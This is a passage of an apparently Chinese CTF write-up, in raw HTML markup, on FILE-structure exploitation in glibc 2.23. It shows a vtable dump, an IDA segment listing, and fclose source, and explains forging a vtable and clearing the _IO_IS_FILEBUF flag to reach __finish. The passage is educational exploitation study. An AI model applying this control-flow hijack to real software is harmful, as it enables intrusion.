&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __finish = &lt;span class=&#34;number&#34;&gt;0xf7e6d990&lt;/span&gt; &amp;lt;_IO_new_file_finish&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __overflow = &lt;span class=&#34;number&#34;&gt;0xf7e6e3b0&lt;/span&gt; &amp;lt;_IO_new_file_overflow&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __underflow = &lt;span class=&#34;number&#34;&gt;0xf7e6e150&lt;/span&gt; &amp;lt;_IO_new_file_underflow&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __uflow = &lt;span class=&#34;number&#34;&gt;0xf7e6f230&lt;/span&gt; &amp;lt;__GI__IO_default_uflow&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __pbackfail = &lt;span class=&#34;number&#34;&gt;0xf7e700c0&lt;/span&gt; &amp;lt;__GI__IO_default_pbackfail&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsputn = &lt;span class=&#34;number&#34;&gt;0xf7e6d600&lt;/span&gt; &amp;lt;_IO_new_file_xsputn&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __xsgetn = &lt;span class=&#34;number&#34;&gt;0xf7e6d210&lt;/span&gt; &amp;lt;__GI__IO_file_xsgetn&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekoff = &lt;span class=&#34;number&#34;&gt;0xf7e6c4b0&lt;/span&gt; &amp;lt;_IO_new_file_seekoff&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seekpos = &lt;span class=&#34;number&#34;&gt;0xf7e6f4d0&lt;/span&gt; &amp;lt;_IO_default_seekpos&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __setbuf = &lt;span class=&#34;number&#34;&gt;0xf7e6c2f0&lt;/span&gt; &amp;lt;_IO_new_file_setbuf&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __sync = &lt;span class=&#34;number&#34;&gt;0xf7e6c1e0&lt;/span&gt; &amp;lt;_IO_new_file_sync&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __doallocate = &lt;span class=&#34;number&#34;&gt;0xf7e618d0&lt;/span&gt; &amp;lt;__GI__IO_file_doallocate&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __read = &lt;span class=&#34;number&#34;&gt;0xf7e6d5b0&lt;/span&gt; &amp;lt;__GI__IO_file_read&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __write = &lt;span class=&#34;number&#34;&gt;0xf7e6d060&lt;/span&gt; &amp;lt;_IO_new_file_write&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __seek = &lt;span class=&#34;number&#34;&gt;0xf7e6cda0&lt;/span&gt; &amp;lt;__GI__IO_file_seek&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __close = &lt;span class=&#34;number&#34;&gt;0xf7e6c2c0&lt;/span&gt; &amp;lt;__GI__IO_file_close&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __stat = &lt;span class=&#34;number&#34;&gt;0xf7e6d040&lt;/span&gt; &amp;lt;__GI__IO_file_stat&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __showmanyc = &lt;span class=&#34;number&#34;&gt;0xf7e70250&lt;/span&gt; &amp;lt;_IO_default_showmanyc&amp;gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __imbue = &lt;span class=&#34;number&#34;&gt;0xf7e70260&lt;/span&gt; &amp;lt;_IO_default_imbue&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为当前版本还是 2.23，可以直接修改虚表，但是为了方便还是修改修改 fd 里面的指针，指向一个伪造虚表&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;260 name            db &lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;h &lt;span class=&#34;title function_&#34;&gt;dup&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(?)&lt;/span&gt;           ; DATA XREF: main+&lt;span class=&#34;number&#34;&gt;9F&lt;/span&gt;↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;260                                         ; main+B4↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;280                 public fp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;280 ; FILE *fp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;280 fp              dd ?                    ; DATA XREF: openfile+&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;↑r&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;280                                         ; openfile+AD↑w ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;280 _bss            ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.bss:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;280&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.prgend:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;284 ; ===========================================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.prgend:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;284&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.prgend:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;284 ; Segment type: Zero-length&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.prgend:&lt;span class=&#34;number&#34;&gt;0804B&lt;/span&gt;284 _prgend         segment byte public &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27; use32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;.prgend:0804B284 _end            label byte&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;.prgend:0804B284 _prgend         ends&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;.prgend:0804B284&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288 ; ===========================================================================&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288 ; Segment type: Externs&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288 ; extern&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288 ; char *strstr(const char *haystack, const char *needle)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288                 extrn strstr:near       ; CODE XREF: _strstr↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B288                                         ; DATA XREF: .got.plt:off_804B00C↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B28C ; int printf(const char *format, ...)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B28C                 extrn printf:near       ; CODE XREF: _printf↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B28C                                         ; DATA XREF: .got.plt:off_804B010↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B290 ; int fclose(FILE *stream)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B290                 extrn fclose:near       ; CODE XREF: _fclose↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B290                                         ; DATA XREF: .got.plt:off_804B014↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B294 ; __sighandler_t signal(int sig, __sighandler_t handler)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B294                 extrn signal:near       ; CODE XREF: _signal↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B294                                         ; DATA XREF: .got.plt:off_804B018↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B298 ; unsigned int alarm(unsigned int seconds)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B298                 extrn alarm:near        ; CODE XREF: _alarm↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B298                                         ; DATA XREF: .got.plt:off_804B01C↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B29C ; size_t fread(void *ptr, size_t size, size_t n, FILE *stream)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B29C                 extrn fread:near        ; CODE XREF: _fread↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B29C                                         ; DATA XREF: .got.plt:off_804B020↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A0 ; int puts(const char *s)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A0                 extrn puts:near         ; CODE XREF: _puts↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A0                                         ; DATA XREF: .got.plt:off_804B024↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A4 ; void exit(int status)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A4                 extrn exit:near         ; CODE XREF: _exit↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A4                                         ; DATA XREF: .got.plt:off_804B028↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A8 ; char *strchr(const char *s, int c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A8                 extrn strchr:near       ; CODE XREF: _strchr↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2A8                                         ; DATA XREF: .got.plt:off_804B02C↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2AC ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2AC                 extrn __libc_start_main:near&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2AC                                         ; CODE XREF: ___libc_start_main↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2AC                                         ; DATA XREF: .got.plt:off_804B030↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B0 ; int setvbuf(FILE *stream, char *buf, int modes, size_t n)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B0                 extrn setvbuf:near      ; CODE XREF: _setvbuf↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B0                                         ; DATA XREF: .got.plt:off_804B034↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B4 ; FILE *fopen(const char *filename, const char *modes)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B4                 extrn fopen:near        ; CODE XREF: _fopen↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B4                                         ; DATA XREF: .got.plt:off_804B038↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B8 ; void *memset(void *s, int c, size_t n)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B8                 extrn memset:near       ; CODE XREF: _memset↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2B8                                         ; DATA XREF: .got.plt:off_804B03C↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2BC                 extrn __isoc99_scanf:near&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2BC                                         ; CODE XREF: ___isoc99_scanf↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2BC                                         ; DATA XREF: .got.plt:off_804B040↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C0 ; int atoi(const char *nptr)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C0                 extrn atoi:near         ; CODE XREF: _atoi↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C0                                         ; DATA XREF: .got.plt:off_804B044↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C4                 extrn __imp___gmon_start__:near ; weak&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C4                                         ; CODE XREF: __gmon_start__↑j&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C4                                         ; DATA XREF: .got:__gmon_start___ptr↑o&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;extern:0804B2C4                 end _start&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们产看内存空间发现，在 fp 后有足够多的空间来放我们的 fake_file（虽然 filename 也很大，但是文件名只可以读取 63 字节）. 所以我们将 file 放在此处，同时伪造的时候要注意如何跳过 fclose 的一些检查：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_file_flags &amp;amp; _IO_IS_FILEBUF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    _IO_un_link ((&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; _IO_FILE_plus *) fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_acquire_lock (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fp-&amp;gt;_IO_file_flags &amp;amp; _IO_IS_FILEBUF)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    status = _IO_file_close_it (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    status = fp-&amp;gt;_flags &amp;amp; _IO_ERR_SEEN ? &lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt; : &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_release_lock (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _IO_FINISH (fp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//可以看到当_IO_IS_FILEBUF位为0时，函数不会执行_IO_un_link和_IO_file_close_it函数，而直接执行_IO_FINISH函数。在_IO_FINISH函数中会直接调用vtable中的__finish函数。其中_IO_IS_FILEBUF被定义为0x2000。_flags &amp;amp; 0x2000为0就会直接调用_IO_FINSH(fp)，_IO_FINISH(fp)相当于调用fp-&amp;gt;vtabl-&amp;gt;__finish(fp)；对于不同的函数，检查可能时不一样的，这就需要libc源码分析了。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//此外还有其他的绕过方法&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 